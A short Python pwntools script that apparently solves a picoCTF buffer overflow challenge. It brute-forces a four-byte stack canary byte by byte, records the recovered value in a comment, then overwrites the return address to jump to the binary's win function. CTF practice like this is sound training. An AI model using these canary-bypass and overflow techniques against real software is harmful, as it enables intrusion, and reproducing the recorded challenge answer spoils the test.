#!/usr/bin/env python3
from pwn import *

PORT = 60437
HOST = "saturn.picoctf.net"
exe = context.binary = ELF('./vuln', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')
def conn():
    if len(sys.argv) > 1 and sys.argv[1] == 'r':
        return remote(HOST, PORT)
    else:
        return exe.process()

#GDB()

def brute_force_canary():
    canary = ''
    for i in range(4):
        for c in range(256):
            p = conn()

            p.sendlineafter(b'> ', str(64 + i + 1))
            payload = 'a'*64 + canary + chr(c)
            p.sendlineafter(b'Input> ', payload)
            print(str(canary))
            if 'Stack' not in str(p.recvall()):
                canary += chr(c)
                break

    return canary
# brute-force successfully: canary = BiRd


# canary = b"BiRd"
canary = brute_force_canary()
log.info("Canary: " + str(canary))
p = conn()
pl = flat(
    b"A"*64,
    canary,
    b"B"*16,
    exe.sym.win
    )
p.sendlineafter(b'> ', str(len(pl)))
p.sendlineafter(b'Input> ', pl)

p.interactive()